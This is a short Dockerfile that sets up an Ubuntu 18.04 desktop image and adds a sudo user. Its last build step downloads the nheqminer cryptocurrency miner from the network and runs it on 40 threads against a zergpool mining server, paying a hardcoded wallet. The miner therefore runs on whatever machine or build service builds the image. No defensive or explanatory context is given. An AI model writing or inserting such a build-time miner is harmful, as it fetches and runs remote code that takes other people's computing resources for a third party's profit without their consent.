FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse

RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u DFZ9WV1uNvkExREPyuWZWBpDUctPXbBy9r.node-18 -p x c=DGB -t 40
